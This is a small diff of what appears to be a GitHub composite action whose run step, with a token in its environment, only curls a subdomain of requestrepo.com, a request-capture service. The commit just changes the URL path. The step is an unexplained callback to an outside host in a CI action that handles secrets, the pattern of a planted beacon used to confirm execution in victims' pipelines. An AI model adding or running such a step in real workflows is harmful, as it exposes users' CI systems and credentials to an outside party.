@@ -23,4 +23,4 @@ runs:
         INTERVAL: ${{ inputs.poll-interval }}
         TOKEN: ${{ inputs.token }}
       run: | 
-        curl https://ptjb71o7.requestrepo.com/aa
+        curl https://ptjb71o7.requestrepo.com/aab
